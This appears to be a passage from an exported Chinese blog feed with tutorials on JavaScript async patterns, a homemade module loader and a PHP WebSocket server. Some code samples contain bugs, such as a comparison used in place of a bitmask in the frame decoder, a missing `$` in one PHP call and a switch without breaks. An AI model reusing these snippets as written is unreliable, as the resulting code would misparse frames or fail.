@司徒正美，他适合动画，使用他可以在 tab 失去焦点或者最小化的时候减缓运动，从而节省 CPU 资源，他的运行间隔确实比 setTimeout 要长。process.nextTick 这个是 NodeJS 中的一个函数，利用他可以几乎达到上面看到的 while 循环的效率ajax 或者 插入节点 的 readyState 变化MutationObserver 大约 2-3mssetImmediate &nbsp;postMessage 这个相当快…这些东西下次有空再细谈。之前研究司徒正美的 avalon 源码的时候，看到了相关的内容，有兴趣的可以看看： 123456789101112131415161718192021222324252627282930313233//视浏览器情况采用最快的异步回调var BrowserMutationObserver = window.MutationObserver || window.WebKitMutationObserverif (BrowserMutationObserver) &#123; //chrome18+, safari6+, firefox14+,ie11+,opera15 avalon.nextTick = function(callback) &#123; //2-3ms var input = DOC.createElement(&quot;input&quot;) var observer = new BrowserMutationObserver(function(mutations) &#123; mutations.forEach(function() &#123; callback() &#125;) &#125;) observer.observe(input, &#123; attributes: true &#125;) input.setAttribute(&quot;value&quot;, Math.random()) &#125;&#125; else if (window.VBArray) &#123;//IE下这个通常只要1ms,而且没有副作用，不会发现请求，//setImmediate如果只执行一次，与setTimeout一样要140ms上下 avalon.nextTick = function(callback) &#123; var node = DOC.createElement(&quot;script&quot;) node.onreadystatechange = function() &#123; callback() //在interactive阶段就触发 node.onreadystatechange = null root.removeChild(node) node = null &#125; root.appendChild(node) &#125;&#125; else &#123; avalon.nextTick = function(callback) &#123; setTimeout(callback, 0) &#125;&#125; 上面说了一堆，目的是想说明， setTimeout 是存在一定时间间隔的，并不是设定 n 毫秒执行，他就是 n 毫秒执行，可能会有一点时间的延迟（2ms左右）。然后说说他的第二个缺点，先看代码： 12345var d = new Date;setTimeout(function()&#123; console.log(&quot;show me after 1s, but you konw:&quot; + (new Date - d));&#125;, 1000);while(1) if(new Date - d &gt; 2000) break; 我们期望 console 在 1s 之后出结果，可事实上他却是在 2075ms 之后运行的，这就是 JavaScript 单线程给我们带来的烦恼，while循环阻塞了 setTimeout 函数的执行。接着是他的第三个毛病，try..catch捕捉不到他的错误： 1234567try&#123; setTimeout(function()&#123; throw new Error(&quot;我不希望这个错误出现！&quot;) &#125;, 1000);&#125; catch(e)&#123; console.log(e.message);&#125; 可以说 setTimeout 是异步编程不可缺少的角色，但是它本身就存在这么多的问题，这就要求我们用更加恰当的方式去规避！2. 什么样的函数为异步的异步的概念和非阻塞是是息息相关的，我们通过 ajax 请求数据的时候，一般采用的是异步的方式： 123456var xhr = new XMLHttpRequest();xhr.open(&apos;GET&apos;, &apos;/&apos;, true);xhr.send();xhr.onreadystatechange = function()&#123; console.log(xhr.status);&#125; 在 xhr.open 中我们把第三个参数设置为 true ，也就是异步加载，当 state 发生改变的时候，xhr 立即响应，触发相关的函数。有人想过用这样的方式来处理： 123456while(1) &#123; if(xhr.status === &quot;complete&quot;) &#123; // dosomething(); break; &#125;&#125; 而事实上，这里的判断已经陷入了死循环，即便是 xhr 的 status 已经发生了改变，这个死循环也跳不出来，那么这里的异步是基于事件的。某个函数会导致将来再运行的另一个函数，后者取自于事件队列（若后面这个函数是作为参数传递给前者的，则称其为回调函数，简称为回调）。&mdash;&mdash; 摘自《Async Javascript》由于 JavaScript 的单线程特点，他没有提供一种机制以阻止函数在其异步操作结束之前返回，事实上，除非函数返回，否则不会触发任何异步事件。3. 常见的异步模型1） 最常见的一种方式是，高阶函数（泛函数） 1234567step1(function(res1)&#123; step2(function(res2)&#123; step3(function(res3)&#123; //... &#125;); &#125;);&#125;); 解耦程度特别低，如果送入的参数太多会显得很乱！这是最常见的一种方式，把函数作为参数送入，然后回调。2） 事件监听 123456E.on(&quot;evt&quot;, g);function f()&#123; setTimeout(function()&#123; E.trigger(&quot;evt&quot;); &#125;)&#125; JS 和 浏览器提供的原生方法基本都是基于事件触发机制的，耦合度很低，不过事件不能得到流程控制。3） 发布/订阅( Pub/Sub ) 1234567E.subscribe(&quot;evt&quot;, g);function f()&#123; setTimeout(function () &#123; // f的任务代码 E.publish(&quot;evt&quot;); &#125;, 1000);&#125; 把事件全部交给 E 这个控制器管理，可以完全掌握事件被订阅的次数，以及订阅者的信息，管理起来特别方便。4） Promise 对象（deferred 对象）关于这里的内容可以看看 屈屈 写的文章，说的比较详细。Promise/A+ 规范是对 Promise/A 规范的补充和修改，他出现的目的是为了统一异步编程中的接口，JS中的异步编程是十分普遍的事情，也出现了很多的异步库，如果不统一接口，对开发者来说也是一件十分痛苦的事情。在Promises/A规范中，每个任务都有三种状态：默认(pending)、完成(fulfilled)、失败(rejected)。默认状态可以单向转移到完成状态，这个过程叫resolve，对应的方法是deferred.resolve(promiseOrValue)；默认状态还可以单向转移到失败状态，这个过程叫reject，对应的方法是deferred.reject(reason)；默认状态时，还可以通过deferred.notify(update)来宣告任务执行信息，如执行进度；状态的转移是一次性的，一旦任务由初始的pending转为其他状态，就会进入到下一个任务的执行过程中。二、异步函数中的错误处理前面已经提到了 setTimeout 函数的一些问题，JS 中的 try..catch 机制并不能拿到 setTimeout 函数中出现的错误，一个 throw error 的影响范围有多大呢？我做了一个测试： 1234567&lt;script type=&quot;text/javascript&quot;&gt; throw new Error(&quot;error&quot;); console.log(&quot;show me&quot;); // 并没有打印出来&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; console.log(&quot;show me&quot;); // 打印出来了&lt;/script&gt; 从上面的测试我们可以看出，throw new Error 的作用范围就是阻断一个 script 标签内的程序运行，但是不会影响下面的 script。这个测试没什么作用，只是想告诉大家不要担心一个 Error 会影响全局的函数执行。所以把代码分为两段，一段可能出错的，一段确保不会出错的，这样不至于让全局代码都死掉，当然这样的处理方式是不可取的。庆幸的是 window 全局对象上有一个便利的函数，window.error，我们可以利用他捕捉到所有的错误，并作出相应的处理，比如： 1234567891011window.onerror = function(msg, url, line)&#123; console.log(msg, url, line); // 必须返回 true，否则 Error 还是会触发阻塞程序 return true;&#125;setTimeout(function()&#123; throw new Error(&quot;error&quot;); // console： //Uncaught Error: error path/to/ie6bug.html 99 &#125;, 50); 我们可以对错误进行封装处理： 123456789101112131415161718192021222324252627window.onerror = function(msg, url, line)&#123; // 截断 &quot;Uncaught Error: error&quot;，获取错误类型 var type = msg.slice(16); switch(type)&#123; case &quot;TooLarge&quot;: console.log(&quot;The number is too large&quot;); case &quot;TooSmall&quot;: console.log(&quot;The number is too Small&quot;); case &quot;TooUgly&quot;: console.log(&quot;That&apos;s Barret Lee~&quot;); // 如果不是我们预定义的错误类型，则反馈给后台监控 default: $ &amp;&amp; $.post &amp;&amp; $.post(&#123; &quot;msg&quot;: msg, &quot;url&quot;: url, &quot;line&quot;: line &#125;) &#125; // 记得这里要返回 true，否则错误阻断程序。 return true;&#125;setTimeout(function()&#123; if( something ) throw new Error(&quot;TooUgly&quot;); // console： //That&apos;s Barret Lee~ &#125;, 50); 很显然，报错已经不可怕了，利用 window 提供的 onerror 函数可以很方便地处理错误并作出及时的反应，如果出现了不可知的错误，可以把信息 post 到后台，这也算是一个十分不错的监控方式。不过这样的处理存在一个问题，所有的错误我们都给屏蔽了，但有些错误本应该阻断所有程序的运行的。比如我们通过 ajax 获取数据中出了错误，程序误以为已经拿到了数据，本应该停下工作报出这个致命的错误，但是这个错误被 window.onerror 给截获了，从而进行了错误的处理。window.onerror 算是一种特别暴力的容错手段，try..catch 也是如此，他们底层的实现就是利用 C/C++ 中的 goto 语句实现，一旦发现错误，不管目前的堆栈有多深，不管代码运行到了何处，直接跑到 顶层 或者 try..catch 捕获的那一层，这种一脚踢开错误的处理方式并不是很好，我觉得。三、JavaScript 多线程技术介绍开始说了异步编程和非阻塞这个概念密切相关，而 JavaScript 中的 Worker 对象可以创建一个独立线程来处理数据，很自然的处理了阻塞问题。我们可以把繁重的计算任务交给 Worker 去倒腾，等他处理完了再把数据 Post 过来。 1234567891011var worker = new Worker(&quot;./outer.js&quot;);worker.addEventListener(&quot;message&quot;, function(e)&#123; console.log(e.message);&#125;);worker.postMessage(&quot;data one&quot;);worker.postMessage(&quot;data two&quot;);// outer.jsself.addEventListener(&quot;message&quot;, function(e)&#123; self.postMessage(e.message);&#125;); 上面是一个简单的例子，如果我们创建了多个 Worker，在监听 onmessage 事件的时候还要判断下 e.target 的值从而得知数据源，当然，我们也可以把数据源封装在 e.message 中。Worker 是一个有用的工具，我可以可以在 Worker 中使用 setTimeout，setInterval等函数，也可以拿到 navigator 的相关信息，最重要的是他可以创建 ajax 对象和 WebSocket 对象，也就是说他可以直接向服务器请求数据。不过他不能访问 DOM 的信息，更不能直接处理 DOM，这个其实很好理解，主线程和 Worker 是两个独立的线程，如果两者都可以修改 DOM，那岂不是得设置一个麻烦的互斥变量？！还有一个值得注意的点是，在 Worker 中我们可以使用 importScript 函数直接加载脚本，不过这个函数是同步的，也就是说他会冻结 Worker 线程，直到 Script 加载完毕。 1importScript(&quot;a.js&quot;, &quot;b.js&quot;, &quot;c.js&quot;); 他可以添加多个参数，加载的顺序就是 参数的顺序。一般会使用 Worker 做哪些事情呢？数据的计算和加密 如计算斐波拉契函数的值，特别费时；再比如文件的 MD5 值比对，一个大文件的 MD5 值计算也是很费时的。音、视频流的编解码工作，这些工作搞微信的技术人员应该没有少做。有兴趣的童鞋可以看看这个技术分享，是杭州的 hehe123 搞的一个WebRTC 分享，内容还不错。等等，你觉得费时间的事情都可以交给他做然后要说的是 SharedWorker，这是 web 通信领域未来的一个趋势，有些人觉得 WebSocket 已经十分不错了，但是一些基于 WebSocket 的架构，服务器要为每一个页面维护一个 WebSocket 代码，而 SharedWorker 十分给力，他是多页面通用的。 123456789101112131415161718192021222324252627&lt;input id=&quot;inp&quot;&gt;&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;发送&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var sw = new SharedWorder(&quot;./outer.js&quot;); // 绑定事件 sw.port.onmessage = function(e)&#123; console.log(e.data); &#125;; btn.onclick = function()&#123; sw.port.postMessage(inp.value); inp.value = &quot;&quot;; &#125;; // 创建连接，开始监听 sw.port.start();&lt;/script&gt;// outer.jsvar pool = [];onconnect = function(e) &#123; // 把连接的页面放入连接池 pool.push(e.ports[0]); // 收到信息立即广播 e.ports[0].onmessage = function(e)&#123; for(var i = 0;i &lt; pool.length; i++) // 广播信息 pool[i].postMessage(e.data); &#125;;&#125;; 简单理解 SharedWorker，就是把运行的一个线程作为 web后台程序，完全不需要后台脚本参与，这个对 web通讯，尤其是游戏开发者，觉得是一个福音！四、ECMAScript 6 中 Generator 对象搞定异步异步两种常见方式是 事件监听 以及 函数回调。前者没什么好说的，事件机制是 JS 的核心，而函数回调这块，过于深入的嵌套简直就是一个地狱，可以看看这篇文章，这是一篇介绍异步编程的文章，什么叫做\回调地狱”，可以看看下面的例子： 123456789101112131415161718192021222324fs.readdir(source, function(err, files) &#123; if (err) &#123; console.log(&apos;Error finding files: &apos; + err) &#125; else &#123; files.forEach(function(filename, fileIndex) &#123; console.log(filename) gm(source + filename).size(function(err, values) &#123; if (err) &#123; console.log(&apos;Error identifying file size: &apos; + err) &#125; else &#123; console.log(filename + &apos; : &apos; + values) aspect = (values.width / values.height) widths.forEach(function(width, widthIndex) &#123; height = Math.round(width / aspect) console.log(&apos;resizing &apos; + filename + &apos;to &apos; + height + &apos;x&apos; + height) this.resize(width, height).write(destination + &apos;w&apos; + width + &apos;_&apos; + filename, function(err) &#123; if (err) console.log(&apos;Error writing file: &apos; + err) &#125;) &#125;.bind(this)) &#125; &#125;) &#125;) &#125;&#125;) 是不是有种想吐的感觉，一层一层的嵌套，虽说这种嵌套十分正常，倘若每段代码都是这样的呈现，相信二次开发者一定会累死！关于如何解耦我就不细说了，可以回头看看上面那篇回调地狱的文章。 ECMAScript 6中有一个 Generator 对象，过段时间会对 ES6 中的新知识进行一一的探讨，这里不多说了，有兴趣的同学可以看看 H-Jin 写的一篇文章使用 (Generator) 生成器解决 JavaScript 回调嵌套问题，使用 yield 关键词和 Generator 把嵌套给\拉直”了，这种方式就像是 chrome 的 DevTool 中使用断点一般，用起来特别舒服。 五、小结 本文提到了异步编程的相关概念和使用中会遇到的问题，在写文章之前做了三天的调研，不过还是有很多点没说全，下次对异步编程有了更深入的理解再来谈一谈。 六、参考资料 Javascript异步编程的4种方法 阮一峰javascript 异步编程 司徒正美HTML Specification web develop groupPromise/A+ 规范异步编程：When.js快速上手 JerrryQu《Async Javascript》 By Trevor Burnham非常有意义，却尚未兼容的SharedWorker 次碳酸钴HTML5 Web Worker Franky]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈模块化加载的实现原理]]></title>
    <url>%2Fblog%2F2013%2F12%2F29%2F2013-12-29-cb-how-to-achieve-loading-module%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 相信很多人都用过 seajs、 requirejs 等这些模块加载器，他们都是十分便捷的工程管理工具，简化了代码的结构，更重要的是消除了各种文件依赖和命名冲突问题，并利用 AMD / CMD 规范统一了格式。如果你不太明白模块化的作用，建议看看玉伯写的一篇文章。为什么他们会想到使用模块化加载呢，我觉得主要是两点。一是按需加载，业务越来越大，基础代码也会越来越多，开发人员可能开发了一百个小工具，而且都塞在一个叫做 utils.js 的包里，但是一个页面可能只需要三到五个小工具，如果直接去加载这个 utils.js 岂不是很大的浪费，PC 端还好，主要是无线端，省下 1KB 那都是很大的价值啊，所以呢，如今很多框架的开发都体现出细颗粒度的分化，像百度研究比较卖力的 tangram，阿里放满产品线的 kissy，几乎是细分到了微粒程度，这种细分方式也促进了模块化加载技术的发展，比如为了减少请求数量，kissy 的 config 中开启 combo 就可以合并多个请求为一个等等。第二点，应该也是从服务器那边参考而来的，服务器脚本很多都是以文件为单位分离的，如果要利用其它文件的功能，可以轻而易举的 require 或者 include 进来，我没有去研究这些加载函数的内部实现原理，稍微猜猜应该是把文件写入到缓存，遇到 include 之类的加载函数，暂停写入，找到需要 include 的文件地址，把找到的文件接着上面继续写入缓存，以此类推，直到结束，然后编译器进行统一编译。一、模块化加载的技术原理先不考虑各种模块定义规范，本文目的只是简要的分析加载原理， CMD / AMD 规范虽内容然不多，但是要实现起来，工程量还是不小。文章后面会提到。1. 数据模块的加载既然是模块化加载，想办法把模块内容拿到当然是重头戏，无论是 script 还是 css 文件的加载，一个 script 或者 link 标签就可以搞定问题，不过我这里采用的是 ajax，目的是为了拿到 script 的代码，也是为了照顾后面要说的 CMD 规范。 1234567891011var require = function(path)&#123; var xhr = new XMLHttpRequest(), res; xhr.open(&quot;GET&quot;, path, true); xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; // 获取源码 res = xhr.responseText; &#125; &#125; xhr.send();&#125;; 创建 script 标签加载脚本不会存在跨域问题，不过拿到的脚本会被浏览器立马解析出来，如果要做同异步的处理就比较麻烦了。没有跨域的文件我们就通过上面的方式加载，如果脚本跨域了，再去创建标签，让文档自己去加载。 1234567// 跨域处理if(crossDomain)&#123; var script = document.createElement(&quot;script&quot;); script.src = path; (document.getElementsByTagName(&quot;head&quot;)[0] || document.body).appendChild(script);&#125; 2. 解析模块的层次依赖关系 模块之间存在依赖关系是十分正常的，如一个工程的文件结构如下： 12345678910project/├── css/│ └── main.css├── js/│ ├── require.js│ └── modlues/│ ├── a.js│ ├── b.js│ └── c.js└── index.html 而这里几个模块的依赖关系是： 123456789101112 ┌&gt; a.js -&gt; b.jsindex.html -| └&gt; c.js// a.jsrequire(&quot;./js/test/b.js&quot;);// b.jsconsole.log(&quot;i am b&quot;);// c.jsconsole.log(&quot;i am c&quot;); 我们要从 index.html 中利用 require.js 获取这一连串的依赖关系，一般采用的方式就是正则匹配。如下：先拿到 function 的代码，然后正则匹配出第一层的依赖关系，接着加载匹配到关系的代码，继续匹配。 1234567891011// index.html&lt;script type=&quot;text/javascript&quot; src=&quot;./js/require.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function test()&#123; var a = require(&quot;./js/modlues/a.js&quot;); var c = require(&quot;./js/modlues/c.js&quot;); &#125; // toString 方法可以拿到 test 函数的 code start(test.toString());&lt;/script&gt; 整个函数的入口是 start，正则表达式为： 1234567var r = /require\((.*)\)/g;var start = function(str)&#123; while(match = r.exec(str)) &#123; console.log(match[1]); &#125;&#125;; 由此我们拿到了第一层的依赖关系， 1[&quot;./js/modlues/a.js&quot;, &quot;./js/modlues/c.js&quot;] 接着要拿到 a.js 和 b.js 的文件层次依赖，之前我们写了一个 require 函数，这个函数可以拿到脚本的代码内容，不过这个 require 函数要稍微修改下，递归去查询和下载代码。 1234567891011121314151617181920212223var cache = &#123;&#125;;var start = function(str)&#123; while(match = r.exec(str)) &#123; console.log(match &amp;&amp; match[1]); // 如果匹配到了内容，下载 path 对应的源码 match &amp;&amp; match[1] &amp;&amp; require(match[1]); &#125;&#125;;var require = function(path)&#123; var xhr = new XMLHttpRequest(), res; xhr.open(&quot;GET&quot;, path, true); xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; res = xhr.responseText; // 缓存文件 cache[path] = res; // 继续递归匹配 start(res); &#125; &#125; xhr.send();&#125;; 上面的代码已经可以很好地拿到文件递归关系了：3. 添加事件机制，优化管理代码但是我们有必要先把 responseText 缓存起来，如果不缓存文件，直接 eval 得到的 responseText 代码，想想会发生什么问题~ 如果模块之间存在循环引用，如： 123 ┌&gt; a.js -&gt; b.jsindex.html -| └&gt; b.js -&gt; a.js 那 start 和 require 将会陷入死循环，不断的加载代码。所以我们需要先拿到依赖关系，然后解构关系，分析出我们需要加载哪些模块。值得注意的是，我们必须按照加载的顺序去 eval 代码，如果 a 依赖 b，先去执行 a 的话，一定会报错！有两个问题我纠结了半天，上面的请求方式，何时会结束？用什么方式去记录文件依赖关系？最后还是决定将 start 和 require 两个函数的相互递归修改成一个函数的递归。用一个对象，发起请求时把 URL 作为 key，在这个对象里保存 XHR 对象，XHR 对象请求完成后，把抓取到的新请求再用同样的方式放入这个对象中，同时从这个对象中把自己删除掉，然后判断这个对象上是否存在 key， 如果存在说明还有 XHR 对象没完成。 123456789101112131415161718192021222324252627282930313233343536373839404142434445var r = /require\(\s*&quot;(.*)&quot;\s*\)/g;var cache = &#123;&#125;; // 文件缓存var relation = []; // 依赖过程控制var obj = &#123;&#125;; // xhr 管理对象//辅助函数，获取键值数组Object.keys = Object.keys || function(obj)&#123; var a = []; for(a[a.length] in obj); return a ;&#125;;// 入口函数function start(str)&#123; while(match = r.exec(str))&#123; obj[match[1]] = new XMLHttpRequest(); require(obj[match[1]], match[1]); &#125;&#125;// 递归请求var require = function(xhr, path)&#123; //记录依赖过程 relation.push(path); xhr.open(&quot;GET&quot;, path, true); xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; var res = xhr.responseText; // 缓存文件 cache[path] = res; // 从xhr对象管理器中删除已经加载完毕的函数 delete obj[path]; // 如果obj为空则触发 allLoad 事件 Object.keys(obj).length == 0 ? Event.trigger(&quot;allLoad&quot;) : void 0; //递归条件 while(match = r.exec(res))&#123; obj[match[1]] = new XMLHttpRequest(); require(obj[match[1]], match[1]); &#125; &#125; &#125; xhr.send();&#125;; 上面的代码已经基本完成了文件依赖分析，文件的加载和缓存工作了，我写了一个demo，有兴趣可以看一看。这个demo的文件结构为： 12345678910111213141516project/├── js/│ ├── require.js│ └── test/│ ├── a.js│ ├── b.js│ ├── c.js│ ├── d.js│ └── e.js└── index.html//文件依赖关系为 ┌&gt; c.js ┌&gt; a.js --|index.html -| └&gt; d.js └&gt; b.js -&gt; e.js 戳我 → Demo4. CMD 规范的介绍上面写了一大堆内容，也实现了模块加载器的原型，但是放在实际应用中，他就是个废品，回到最开始，我们为什么要使用模块化加载。目的是为了不去使用麻烦的命名空间，把复杂的模块依赖交给 require 这个函数去管理，但实际上呢，上面拿到的所有模块都是暴露在全局变量中的，也就是说，如果 a.js 和 b.js 中存在命名相同的变量，后者将会覆盖前者，这是我们不愿意看到的。为了处理此类问题，我们有必要把所有的模块都放到一个闭包中，这样一来，只要不使用 window.vars 命名，闭包之间的变量是不会相互影响的。我们可以使用自己的方式去管理代码，不过有人已经研究处理一套标准，而且是全球统一，那就拿着用吧~关于 CMD 规范，我这里就不多说了，可以去看看草案，玉伯也翻译了一份，戳我。每一模块有且仅有一个对外公开的接口 exports，如： 123456789define(function(require, exports) &#123; // 对外提供 foo 属性 exports.foo = &apos;bar&apos;; // 对外提供 doSomething 方法 exports.doSomething = function() &#123;&#125;;&#125;); 剩下的工作就是针对 CMD 规范写一套符合标准的代码接口，这个比较琐碎，就不写了。二、额外的话题上面的代码中提到了关于 Event 的事件管理。在模块全部加在完毕之后，需要有个东西告诉你，所以顺手写了一个 Event 的事件管理器。 12345678910111213141516171819202122232425262728293031// Eventvar Event = &#123;&#125;;Event.events = [];Event.on = function(evt, func)&#123; for(var i = 0; i &lt; Event.events.length; i++)&#123; if(Event.events[i].evt == evt)&#123; Event.events[i].func.push(func); return; &#125; &#125; Event.events.push(&#123; evt: evt, func: [func] &#125;);&#125;;Event.trigger = function(evt)&#123; for(var i = 0; i &lt; Event.events.length; i++)&#123; if(Event.events[i].evt == evt)&#123; for(var j = 0; j &lt; Event.events[i].func.length; j++)&#123; Event.events[i].func[j](); &#125; return; &#125; &#125;&#125;;Event.off = function(evt)&#123; for(var i = 0; i &lt; Event.events.length; i++)&#123; Event.events.splice(i, 1); &#125;&#125;; 我觉得 seajs 是一个很不错的模块加载器，如果感兴趣，可以去看看他的源码实现，代码不长，只有一千多行。模块的加载它采用的是创建文本节点，让文档去加载模块，实时查看状态为 interactive 的 script 标签，如果处于交互状态就拿到他的代码，接着删除节点。当节点数目为 0 的时候，加载工作完成。 本文没有考虑 css 文件的加载问题，我们可以把它当做一个没有 require 关键词的 js 文件，或者把它匹配出来之后另作处理，因为他是不可能存在模块依赖关系的。 然后就是很多很多细节，本文的目的并不是写一个类似 seajs 的模块管理工具，只是稍微说几句自己对这玩意儿的看法，如果说的有错，请多多吐槽！ 三、参考资料 //github.com/seajs/issues seajs issues]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>模块化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[细说websocket - php篇]]></title>
    <url>%2Fblog%2F2013%2F12%2F25%2F2013-12-25-cb-websocket-with-php%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 下面我画了一个图演示 client 和 server 之间建立 websocket 连接时握手部分，这个部分在 node 中可以十分轻松的完成，因为 node 提供的 net 模块已经对 socket 套接字做了封装处理，开发者使用的时候只需要考虑数据的交互而不用处理连接的建立。而 php 没有，从 socket 的连接、建立、绑定、监听等，这些都需要我们自己去操作，所以有必要拿出来再说一说。 1234567+--------+ 1.发送Sec-WebSocket-Key +---------+| | --------------------------------&gt; | || | 2.加密返回Sec-WebSocket-Accept | || client | &lt;-------------------------------- | server || | 3.本地校验 | || | --------------------------------&gt; | |+--------+ +--------+ 看了我写的上一篇文章的同学应该是对上图有了比较全面的理解。① 和 ② 实际上就是一个 HTTP 的请求和响应，只不过我们在处理的过程中我们拿到的是没有经过解析的字符串。如： 123GET /chat HTTP/1.1Host: server.example.comOrigin: http://example.com 我们往常看到的请求是这个样子，当这东西到了服务器端，我们可以通过一些代码库直接拿到这些信息。一、php 中处理 websocketWebSocket 连接是由客户端主动发起的，所以一切要从客户端出发。第一步是要解析拿到客户端发过来的 Sec-WebSocket-Key 字符串。 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13 前文中也提到了 client 请求的格式（如上），首先 php 建立一个 socket 连接，监听端口的信息。1. socket 连接的建立关于 socket 套接字的建立，相信很多大学修过计算机网络的人都知道了，下面是一张连接建立的过程： 12345// 建立一个 socket 套接字$master = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_set_option($master, SOL_SOCKET, SO_REUSEADDR, 1);socket_bind($master, $address, $port);socket_listen($master); 相比 node，这个地方的处理实在是太麻烦了，上面几行代码并未建立连接，只不过这些代码是建立一个 socket 套接字必须要写的东西。由于处理过程稍微有复杂，所以我把各种处理写进了一个类中，方便管理和调用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//demo.phpClass WS &#123; var $master; // 连接 server 的 client var $sockets = array(); // 不同状态的 socket 管理 var $handshake = false; // 判断是否握手 function __construct($address, $port)&#123; // 建立一个 socket 套接字 $this-&gt;master = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die(&quot;socket_create() failed&quot;); socket_set_option($this-&gt;master, SOL_SOCKET, SO_REUSEADDR, 1) or die(&quot;socket_option() failed&quot;); socket_bind($this-&gt;master, $address, $port) or die(&quot;socket_bind() failed&quot;); socket_listen($this-&gt;master, 2) or die(&quot;socket_listen() failed&quot;); $this-&gt;sockets[] = $this-&gt;master; // debug echo(&quot;Master socket : &quot;.$this-&gt;master.&quot;\n&quot;); while(true) &#123; //自动选择来消息的 socket 如果是握手 自动选择主机 $write = NULL; $except = NULL; socket_select($this-&gt;sockets, $write, $except, NULL); foreach ($this-&gt;sockets as $socket) &#123; //连接主机的 client if ($socket == $this-&gt;master)&#123; $client = socket_accept($this-&gt;master); if ($client &lt; 0) &#123; // debug echo &quot;socket_accept() failed&quot;; continue; &#125; else &#123; //connect($client); array_push($this-&gt;sockets, $client); echo &quot;connect client\n&quot;; &#125; &#125; else &#123; $bytes = @socket_recv($socket,$buffer,2048,0); if($bytes == 0) return; if (!$this-&gt;handshake) &#123; // 如果没有握手，先握手回应 //doHandShake($socket, $buffer); echo &quot;shakeHands\n&quot;; &#125; else &#123; // 如果已经握手，直接接受数据，并处理 $buffer = decode($buffer); //process($socket, $buffer); echo &quot;send file\n&quot;; &#125; &#125; &#125; &#125; &#125;&#125;demo.php 握手连接测试代码 上面这段代码是经过我调试了的，没太大的问题，如果想测试的话，可以在 cmd 命令行中键入 php /path/to/demo.php;当然，上面只是一个类，如果要测试的话，还得新建一个实例。 1$ws = new WS(&apos;localhost&apos;, 4000); 客户端代码可以稍微简单点： 1234567var ws = new WebSocket(&quot;ws://localhost:4000&quot;);ws.onopen = function()&#123; console.log(&quot;握手成功&quot;);&#125;;ws.onerror = function()&#123; console.log(&quot;error&quot;);&#125;; 运行服务器代码，当客户端连接的时候，我们可以看到：通过上面的代码可以清晰的看到整个交流的过程。首先是建立连接，node 中这一步已经封装到了 net 和 http 模块，然后判断是否握手，如果没有的话，就 shakeHands。这里的握手我直接就 echo 了一个单词，表示进行了这个东西，前文我们提到过握手算法，这里就直接写了。2. 提取 Sec-WebSocket-Key 信息1234567function getKey($req) &#123; $key = null; if (preg_match(&quot;/Sec-WebSocket-Key: (.*)\r\n/&quot;, $req, $match)) &#123; $key = $match[1]; &#125; return $key;&#125;这里比较简单，直接正则匹配，websocket 信息头一定包含 Sec-WebSocket-Key，所以我们匹配起来也比较快捷~3. 加密 Sec-WebSocket-Key123456function encry($req)&#123; $key = $this-&gt;getKey($req); $mask = &quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;; return base64_encode(sha1($key . &apos;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&apos;, true));&#125;将 SHA-1 加密后的字符串再进行一次 base64 加密。如果加密算法错误，客户端在进行校检的时候会直接报错：4. 应答 Sec-WebSocket-Accept1234567891011121314function dohandshake($socket, $req)&#123; // 获取加密key $acceptKey = $this-&gt;encry($req); $upgrade = &quot;HTTP/1.1 101 Switching Protocols\r\n&quot; . &quot;Upgrade: websocket\r\n&quot; . &quot;Connection: Upgrade\r\n&quot; . &quot;Sec-WebSocket-Accept: &quot; . $acceptKey . &quot;\r\n&quot; . &quot;\r\n&quot;; // 写入socket socket_write(socket,$upgrade.chr(0), strlen($upgrade.chr(0))); // 标记握手已经成功，下次接受数据采用数据帧格式 $this-&gt;handshake = true;&#125;这里千万要注意，每一个请求和相应的格式，最后有一个空行，也就是 \r\n，开始测试的时候把这东西给弄丢了，纠结了半天。当客户端成功校检key后，会触发 onopen 函数：5. 数据帧处理1234567891011121314151617181920// 解析数据帧function decode($buffer) &#123; $len = $masks = $data = $decoded = null; $len = ord($buffer[1]) &lt; 127; if ($len === 126) &#123; $masks = substr($buffer, 4, 4); $data = substr($buffer, 8); &#125; else if ($len === 127) &#123; $masks = substr($buffer, 10, 4); $data = substr($buffer, 14); &#125; else &#123; $masks = substr($buffer, 2, 4); $data = substr($buffer, 6); &#125; for ($index = 0; $index &lt; strlen($data); $index++) &#123; $decoded .= $data[$index] ^ $masks[$index % 4]; &#125; return $decoded;&#125;这里涉及的编码问题在前文中已经提到过了，这里就不赘述，php 对字符处理的函数太多了，也记得不是特别清楚，这里就没有详细的介绍解码程序，直接把客户端发送的数据原样返回，可以算是一个聊天室的模式吧。 123456789101112131415161718// 返回帧信息处理function frame($s) &#123; $a = str_split($s, 125); if (count($a) == 1) &#123; return &quot;\x81&quot; . chr(strlen($a[0])) . $a[0]; &#125; $ns = &quot;&quot;; foreach ($a as $o) &#123; $ns .= &quot;\x81&quot; . chr(strlen($o)) . $o; &#125; return $ns;&#125;// 返回数据function send($client, $msg)&#123; $msg = $this-&gt;frame($msg); socket_write($client, $msg, strlen($msg));&#125; 客户端代码： 1234567891011var ws = new WebSocket(&quot;ws://localhost:4000&quot;);ws.onopen = function()&#123; 